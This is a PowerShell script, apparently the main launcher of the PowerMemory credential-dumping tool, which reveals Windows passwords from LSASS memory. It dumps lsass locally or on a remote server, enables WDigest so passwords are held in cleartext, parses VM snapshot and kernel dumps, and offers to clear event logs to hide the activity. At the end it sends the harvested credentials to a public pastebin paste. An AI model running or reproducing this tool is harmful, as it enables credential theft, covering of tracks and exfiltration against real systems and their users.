#requires -version 2
<#

.SYNOPSIS         
    Reveal credentials from Windows Memory

.NOTES    
    Author:         Pierre-Alexandre Braeken
    Creation Date:  2015-05-01

.CREDITS
    Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.

#>
Param
    (
        [Parameter(Position = 0)]        
        [String]
        $relaunched = 0
    )
#---------------------------------------------------------[Initialisations]--------------------------------------------------------
Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

$loggingFunctions = "$scriptPath\logging\Logging.ps1"
$cryptoFunctions = "$scriptPath\utilities\Crypto.ps1"
$DESXFunctions = "$scriptPath\utilities\DESX.ps1"
$utilsFunctions = "$scriptPath\utilities\Utils.ps1"
$domainFunctions = "$scriptPath\utilities\Domain.ps1"
$vipFunctions = "$scriptPath\utilities\VIP.ps1"
$obsoleteSystemsFunctions = "$scriptPath\legacyOS\Get-InformationsFromLegacyOS.ps1"
$supportedOSSystemsFunctions = "$scriptPath\supportedOS\Get-InformationsFromSupportedOS.ps1"
$snapshotFunctions = "$scriptPath\snapshot\snapshot.ps1"
$kernelFunctions = "$scriptPath\kernel\kernel.ps1"

$global:partOfADomain = 0
$adFlag = 0
$osArchitecture = ""
$operatingSystem = ""
$osArchitectureHost = ""
$operatingSystemHost = ""
$server = ""
$elevate = 0
$dev_key = $null
$snapshot = $false
$snapshotVMWare = $false
$kernel = $false
$toADD = 0
$mode = ""
$hostMode = ""

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$scriptName = [System.IO.Path]::GetFileName($scriptFile)
$scriptVersion = "1.2"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$global:streamWriter = New-Object System.IO.StreamWriter $logPathName

#-----------------------------------------------------------[Functions]------------------------------------------------------------

. $loggingFunctions
. $cryptoFunctions
. $DESXFunctions
. $utilsFunctions
. $domainFunctions
. $vipFunctions
. $supportedOSSystemsFunctions
. $obsoleteSystemsFunctions
. $snapshotFunctions
. $kernelFunctions

#----------------------------------------------------------[Execution]----------------------------------------------------------

Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
cls
Write-Output "================================================================================================"
White-Rabbit

# Prerequis
Test-InternetConnection

if($relaunched -eq 0) {
<#
    if(!(Test-IsInLocalAdministratorsGroup)) {
        $elevate = 1    
        Bypass-UAC $scriptPath $logDirectoryPath
    }
    else {    #>
$adminFlag = Test-LocalAdminRights
if($adminFlag -eq $false){        
    Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red    
    $scriptPath = Split-Path $MyInvocation.InvocationName   
    $RWMC = $scriptPath + "\White-Rabbit.ps1 1"     
    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;        
    Stop-Script
}    
    #}
}
Write-Host "================================================================================================"
$activeDirectoryOrNot = Read-Host 'Do you want use Active Directory cmdlets ?
1) Yes
2) No
0) Exit

Enter menu number and press <ENTER>'
switch ($activeDirectoryOrNot){
    "1" {$adFlag = 1}
    "2" {$adFlag = 0}
    "Yes" {$adFlag = 1}
    "No" {$adFlag = 0}
    "Y" {$adFlag = 1}
    "N" {$adFlag = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Active Directory cmdlets will be not used";$adFlag = "0"}
}

$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ?
1) Local
2) Remote
3) lsass process .dmp
4) Hyper-V VM snapshot .dmp
5) VMWare VM snapshot .dmp
6) kernel mode (mode debug must be activated)
7) Local passwords hashes
0) Exit

Enter menu number and press <ENTER>'
switch ($remoteLocalFile){
    "1" {$dump = "gen"}
    "2" {$dump = "remote"}
    "3" {$dump = "dump"}
    "4" {$dump = "snapshot"}
    "5" {$dump = "snapshotVMWare"}
    "6" {$dump = "kernel"}
    "7" {$dump = "hashes"}
    "0" {Stop-Script}
    "m" {cls;White-MakeMeASandwich;Stop-Script}
    default {Write-Output "The option could not be determined... generate local dump"}
}

Set-ActiveDirectoryInformations $adFlag

if($dump -eq "dump" -or $dump -eq "snapshot" -or $dump -eq "snapshotVMWare" -or $dump -eq "kernel") {
    if($dump -eq "dump") {
        $dump = Read-Host 'Enter the path of your lsass process dump'
    }
    else {
        if($dump -eq "snapshot") {
            $snapshot = $true
            $dump = Read-Host 'Enter the path of your VM snapshot dump'
        }
        else {
            if($dump -eq "snapshotVMWare") {
                $snapshotVMWare = $true
                $dump = Read-Host 'Enter the path of your VM snapshot dump'
            }
            else {
                if($dump -eq "kernel") {
                    $kernel = $true
                }
            }
        }
    }
    $mode = Read-Host 'Mode (3 (Windows 2003), 1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 2016 (Windows Server 2016))?'
    switch ($mode){
        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
        "232" {Write-Output "Try to reveal password for Windows 10 32 bits"}
        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
        "2016" {Write-Output "Try to reveal password for Windows 2016"}
        default {
                Write-Output "The mode could not be determined... terminating"
                Stop-Script
        }
    }
}
else {
    if($dump -eq "remote") { 
        $dump = ""
        $server = Read-Host 'Enter the name of the remote server'
        $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture

        $operatingSystemHost = (Get-WmiObject Win32_OperatingSystem).version
        $osArchitectureHost =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

        $hostMode = Get-OperatingSystemMode $operatingSystemHost $osArchitectureHost
    }
    else {
        if($dump -eq "gen") { 
            $operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
            $osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        }
    }
    $mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
}

$exFiltrate = Read-Host 'Do you want to exfiltrate the data (pastebin) ?
1) Yes
2) No
0) Exit

Enter menu number and press <ENTER>'
switch ($exFiltrate){
    "1" {$exFiltrate = 1}
    "2" {$exFiltrate = 0}
    "Yes" {$exFiltrate = 1}
    "No" {$exFiltrate = 0}
    "Y" {$exFiltrate = 1}
    "N" {$exFiltrate = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
}
if($exFiltrate -eq 1) {
    $devKey = Read-Host 'Please, enter your developper key'
}

$clearEventLog = Read-Host 'Do you want to clear event log on this local computer ?
1) Yes
2) No
0) Exit

Enter menu number and press <ENTER>'
switch ($clearEventLog){
    "1" {$clearEventLog = 1}
    "2" {$clearEventLog = 0}
    "Yes" {$clearEventLog = 1}
    "No" {$clearEventLog = 0}
    "Y" {$clearEventLog = 1}
    "N" {$clearEventLog = 0}
    "0" {Stop-Script}    
    default {Write-Output "The option could not be determined... Cleaning of Event Logs will be not used";$clearEventLog = "0"}
}

if($clearEventLog -eq 1) {
     Stop-Activities
}

if($hostMode -ne "") {
    $modeSave = $mode
    $mode = $hostMode
}

if($mode -eq "2r2" -or $mode -eq "232" -or $mode -eq "2016" -or $mode -eq "8.1") {
    if($mode -eq "2r2") {
        if($snapshot -eq $true -or $snapshotVMWare -eq $true) {
            $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
        }
        else {
            $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
        }
    }
    else {
        if($snapshot -eq $true -or $snapshotVMWare -eq $true) {
            $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
        }
        else {
            if($mode -eq "2016"){
                $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
            }
            else {
                if($operatingSystem -eq "10.0.10240") {
                    $memoryWalker = "$scriptPath\debugger\2r2\cdb.exe"
                }
                else {
                    $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
                }
            }
        }
    }
    if($dump -eq "gen") {
        Set-WdigestProvider
    }
    else {
        if($dump -eq "" -and (![string]::IsNullOrEmpty($server))){
            Set-RemoteWdigestProvider $server
        }
    }
}
else {
    if($snapshot -eq $true) {
        $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
    }
    else {
        $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
    }
}

if($hostMode -ne "") {
    $mode = $modeSave
}

Write-Progress -Activity "Setting environment" -status "Running..." -id 1
Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
Write-Progress -Activity "Environment setted" -status "Running..." -id 1
Write-Progress -Activity "Creating msdsc log" -status "Running..." -id 1

if($dump -eq "gen"){
    if($mode -eq "2r2") {
        $dumpAProcessPath = "$scriptPath\msdsc.exe"
        &$dumpAProcessPath "lsass" "$logDirectoryPath"
    }
    else {
        if($elevate -eq 0) {
            $process = Get-Process lsass 
            Write-Minidump $process $logDirectoryPath                
        }
    }
}
else {
    if($dump -eq ""){
        $computername = $server
        # To disable UAC remote (need a reboot)        
        # Disable-UAC $server       
        Remote-Dumping $computername $scriptPath $logDirectoryPath        
    }
    else {
        $file = $dump
    }
}
if($kernel -eq $false) {
    if($snapshot -eq $false -and $snapshotVMWare -eq $false) {
        if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "8.1" -or $mode -eq "232" -or $mode -eq "2016") {
            Get-SupportedSystemsInformations $buffer $fullScriptPath             
        }
        else {    
            Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
        }
    }
    else {
        if($snapshot -eq $true) {
            Get-VMSnapshotInformations -Buffer $buffer -FullScriptPath $fullScriptPath -Hypervisor 0  # Hyper-V         
        }
        else {
            if($snapshotVMWare -eq $true) {
                Get-VMSnapshotInformations -Buffer $buffer -FullScriptPath $fullScriptPath -Hypervisor 1     
           
            }
        }      
    <#
    else {    
        Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
    } #>
    }
}
else {
    $MemoryKernelWalker = "$scriptPath\debugger\x64\kd.exe"
    $symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
    Get-KernelInformations $buffer $fullScriptPath 
}
Write-Progress -Activity "Removing symbols" -status "Running..." -id 1 
Remove-Item -Recurse -Force c:\symbols
Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
End-Log -streamWriter $global:streamWriter
notepad $logPathName

if($clearEventLog -eq 1) {
     Clear-Activities $scriptPath
}

if($exFiltrate -eq 1 -and !([string]::IsNullOrEmpty($devKey))) {           
    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
    $dataToExfiltrate = Get-Content $logPathName
    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
    $pasteName = "PowerMemory (Follow the White Rabbit)"    
    $url = "https://pastebin.com/api/api_post.php"
    $parameters = "&api_option=paste&api_dev_key=$devKey&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
    Post-HttpRequest $url $parameters
}
cls
